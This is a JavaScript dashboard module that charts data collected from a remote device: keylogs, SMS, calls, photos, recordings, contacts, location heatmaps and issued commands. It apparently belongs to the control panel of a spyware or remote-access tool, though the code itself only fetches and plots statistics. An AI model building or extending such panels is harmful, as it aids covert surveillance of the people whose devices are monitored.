import Chart from 'chart.js/auto';
import 'chartjs-adapter-date-fns';
import flatpickr from 'flatpickr';
import 'flatpickr/dist/flatpickr.min.css';
import html2canvas from 'html2canvas';
import { jsPDF } from 'jspdf';

// Chart.js default configuration
Chart.defaults.font.family = "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
Chart.defaults.color = '#6b7280';
Chart.defaults.plugins.legend.display = false;

class ChartManager {
  constructor() {
    this.charts = {};
    this.dateRange = { start: null, end: null };
    this.initDatePickers();
  }

  initDatePickers() {
    const rangeButtons = document.querySelectorAll('[data-date-range]');
    rangeButtons.forEach(btn => {
      btn.addEventListener('click', (e) => {
        const days = parseInt(e.target.dataset.dateRange);
        this.setDateRange(days);
      });
    });

    // Custom date picker
    const customPicker = document.getElementById('custom-date-picker');
    if (customPicker) {
      flatpickr(customPicker, {
        mode: 'range',
        dateFormat: 'Y-m-d',
        onChange: (selectedDates) => {
          if (selectedDates.length === 2) {
            this.dateRange = {
              start: selectedDates[0],
              end: selectedDates[1]
            };
            this.refreshCharts();
          }
        }
      });
    }
  }

  setDateRange(days) {
    const end = new Date();
    const start = new Date();
    start.setDate(start.getDate() - days);
    
    this.dateRange = { start, end };
    this.refreshCharts();
  }

  async refreshCharts() {
    const deviceId = document.body.dataset.deviceId;
    if (!deviceId) return;

    const params = new URLSearchParams();
    if (this.dateRange.start) {
      const days = Math.ceil((this.dateRange.end - this.dateRange.start) / (1000 * 60 * 60 * 24));
      params.append('days', days);
    }

    try {
      const response = await fetch(`/devices/${deviceId}/statistics?${params}`);
      const data = await response.json();
      
      if (data.status === 'success') {
        this.renderAllCharts(data.data);
      }
    } catch (error) {
      console.error('Failed to fetch statistics:', error);
    }
  }

  renderAllCharts(data) {
    this.renderActivityTimeline(data.activity_timeline);
    this.renderLocationHeatmap(data.location_heatmap);
    this.renderAppUsage(data.app_usage);
    this.renderCallSmsStats(data.call_sms_stats);
    this.renderBatteryNetwork(data.battery_network);
    this.updateOverview(data.overview);
  }

  renderActivityTimeline(data) {
    const ctx = document.getElementById('activity-timeline-chart');
    if (!ctx) return;

    if (this.charts.activityTimeline) {
      this.charts.activityTimeline.destroy();
    }

    this.charts.activityTimeline = new Chart(ctx, {
      type: 'line',
      data: {
        labels: data.map(d => d.date),
        datasets: [
          {
            label: 'Commands',
            data: data.map(d => d.commands),
            borderColor: '#3b82f6',
            backgroundColor: 'rgba(59, 130, 246, 0.1)',
            tension: 0.4
          },
          {
            label: 'Keylogs',
            data: data.map(d => d.keylogs),
            borderColor: '#8b5cf6',
            backgroundColor: 'rgba(139, 92, 246, 0.1)',
            tension: 0.4
          },
          {
            label: 'SMS',
            data: data.map(d => d.sms),
            borderColor: '#10b981',
            backgroundColor: 'rgba(16, 185, 129, 0.1)',
            tension: 0.4
          },
          {
            label: 'Photos',
            data: data.map(d => d.photos),
            borderColor: '#f59e0b',
            backgroundColor: 'rgba(245, 158, 11, 0.1)',
            tension: 0.4
          }
        ]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        interaction: {
          mode: 'index',
          intersect: false
        },
        plugins: {
          legend: {
            display: true,
            position: 'top'
          },
          tooltip: {
            backgroundColor: 'rgba(0, 0, 0, 0.8)',
            padding: 12,
            titleFont: { size: 14, weight: 'bold' },
            bodyFont: { size: 13 },
            cornerRadius: 8
          }
        },
        scales: {
          x: {
            grid: { display: false },
            ticks: { maxRotation: 45, minRotation: 0 }
          },
          y: {
            beginAtZero: true,
            grid: { color: 'rgba(0, 0, 0, 0.05)' }
          }
        }
      }
    });
  }

  renderLocationHeatmap(data) {
    // For heatmap, we'll use a third-party library like Leaflet
    // This is a placeholder - implement with Leaflet.heat plugin
    const container = document.getElementById('location-heatmap');
    if (!container) return;

    // Initialize map if not already initialized
    if (!this.map) {
      this.map = L.map('location-heatmap').setView([0, 0], 2);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
      }).addTo(this.map);
    }

    // Add heatmap layer
    if (data && data.length > 0) {
      const heatData = data.map(loc => [loc.lat, loc.lng, loc.weight]);
      
      if (this.heatLayer) {
        this.map.removeLayer(this.heatLayer);
      }
      
      this.heatLayer = L.heatLayer(heatData, {
        radius: 25,
        blur: 15,
        maxZoom: 17
      }).addTo(this.map);

      // Fit map to markers
      const bounds = L.latLngBounds(data.map(loc => [loc.lat, loc.lng]));
      this.map.fitBounds(bounds);
    }
  }

  renderAppUsage(data) {
    const ctx = document.getElementById('app-usage-chart');
    if (!ctx) return;

    if (this.charts.appUsage) {
      this.charts.appUsage.destroy();
    }

    const colors = [
      '#3b82f6', '#8b5cf6', '#ec4899', '#f59e0b', 
      '#10b981', '#06b6d4', '#6366f1', '#ef4444',
      '#84cc16', '#f97316'
    ];

    this.charts.appUsage = new Chart(ctx, {
      type: 'doughnut',
      data: {
        labels: data.map(d => d.label),
        datasets: [{
          data: data.map(d => d.value),
          backgroundColor: colors,
          borderWidth: 2,
          borderColor: '#fff'
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
          legend: {
            display: true,
            position: 'right',
            labels: { padding: 15, font: { size: 12 } }
          },
          tooltip: {
            backgroundColor: 'rgba(0, 0, 0, 0.8)',
            padding: 12,
            callbacks: {
              label: (context) => {
                const label = context.label || '';
                const value = context.parsed || 0;
                const total = context.dataset.data.reduce((a, b) => a + b, 0);
                const percentage = ((value / total) * 100).toFixed(1);
                return `${label}: ${value} (${percentage}%)`;
              }
            }
          }
        },
        onClick: (event, activeElements) => {
          if (activeElements.length > 0) {
            const index = activeElements[0].index;
            const app = data[index];
            this.drillDownApp(app);
          }
        }
      }
    });
  }

  renderCallSmsStats(data) {
    const ctx = document.getElementById('call-sms-chart');
    if (!ctx) return;

    if (this.charts.callSms) {
      this.charts.callSms.destroy();
    }

    this.charts.callSms = new Chart(ctx, {
      type: 'bar',
      data: {
        labels: data.map(d => d.date),
        datasets: [
          {
            label: 'Calls',
            data: data.map(d => d.calls),
            backgroundColor: '#3b82f6',
            borderRadius: 6
          },
          {
            label: 'SMS Sent',
            data: data.map(d => d.sms_sent),
            backgroundColor: '#10b981',
            borderRadius: 6
          },
          {
            label: 'SMS Received',
            data: data.map(d => d.sms_received),
            backgroundColor: '#8b5cf6',
            borderRadius: 6
          }
        ]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
          legend: {
            display: true,
            position: 'top'
          },
          tooltip: {
            backgroundColor: 'rgba(0, 0, 0, 0.8)',
            padding: 12
          }
        },
        scales: {
          x: {
            stacked: false,
            grid: { display: false }
          },
          y: {
            beginAtZero: true,
            grid: { color: 'rgba(0, 0, 0, 0.05)' }
          }
        }
      }
    });
  }

  renderBatteryNetwork(data) {
    const ctx = document.getElementById('battery-network-chart');
    if (!ctx) return;

    if (this.charts.batteryNetwork) {
      this.charts.batteryNetwork.destroy();
    }

    this.charts.batteryNetwork = new Chart(ctx, {
      type: 'line',
      data: {
        labels: data.map(d => d.date),
        datasets: [
          {
            label: 'Battery %',
            data: data.map(d => d.battery),
            borderColor: '#10b981',
            backgroundColor: 'rgba(16, 185, 129, 0.1)',
            yAxisID: 'y',
            tension: 0.4
          },
          {
            label: 'Signal Strength',
            data: data.map(d => d.signal),
            borderColor: '#3b82f6',
            backgroundColor: 'rgba(59, 130, 246, 0.1)',
            yAxisID: 'y1',
            tension: 0.4
          }
        ]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        interaction: {
          mode: 'index',
          intersect: false
        },
        plugins: {
          legend: {
            display: true,
            position: 'top'
          }
        },
        scales: {
          y: {
            type: 'linear',
            display: true,
            position: 'left',
            min: 0,
            max: 100,
            title: { display: true, text: 'Battery %' }
          },
          y1: {
            type: 'linear',
            display: true,
            position: 'right',
            min: 0,
            max: 5,
            title: { display: true, text: 'Signal' },
            grid: { drawOnChartArea: false }
          }
        }
      }
    });
  }

  updateOverview(data) {
    const elements = {
      'total-commands': data.total_commands,
      'completed-commands': data.completed_commands,
      'total-locations': data.total_locations,
      'total-sms': data.total_sms,
      'total-calls': data.total_calls,
      'total-photos': data.total_photos,
      'total-recordings': data.total_recordings,
      'total-keylogs': data.total_keylogs,
      'total-contacts': data.total_contacts
    };

    Object.entries(elements).forEach(([id, value]) => {
      const el = document.getElementById(id);
      if (el) {
        el.textContent = value;
      }
    });

    const lastActivity = document.getElementById('last-activity');
    if (lastActivity && data.last_activity) {
      lastActivity.textContent = new Date(data.last_activity).toLocaleString();
    }
  }

  async exportChart(chartId, format = 'png') {
    const chartElement = document.getElementById(chartId).parentElement;
    
    if (format === 'png') {
      const canvas = await html2canvas(chartElement);
      const link = document.createElement('a');
      link.download = `${chartId}-${Date.now()}.png`;
      link.href = canvas.toDataURL();
      link.click();
    } else if (format === 'pdf') {
      const canvas = await html2canvas(chartElement);
      const imgData = canvas.toDataURL('image/png');
      const pdf = new jsPDF({
        orientation: canvas.width > canvas.height ? 'landscape' : 'portrait'
      });
      const imgWidth = pdf.internal.pageSize.getWidth();
      const imgHeight = (canvas.height * imgWidth) / canvas.width;
      pdf.addImage(imgData, 'PNG', 0, 0, imgWidth, imgHeight);
      pdf.save(`${chartId}-${Date.now()}.pdf`);
    }
  }

  drillDownApp(app) {
    // Implement drill-down functionality
    // TODO: open a modal with detailed app usage statistics
  }
}

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', () => {
  if (document.querySelector('[data-controller="charts"]')) {
    window.chartManager = new ChartManager();
    
    // Auto-refresh every 5 minutes
    setInterval(() => {
      window.chartManager.refreshCharts();
    }, 5 * 60 * 1000);
    
    // Initial load
    window.chartManager.setDateRange(30);
  }
});

// Export functions
window.exportChart = (chartId, format) => {
  if (window.chartManager) {
    window.chartManager.exportChart(chartId, format);
  }
};

export default ChartManager;
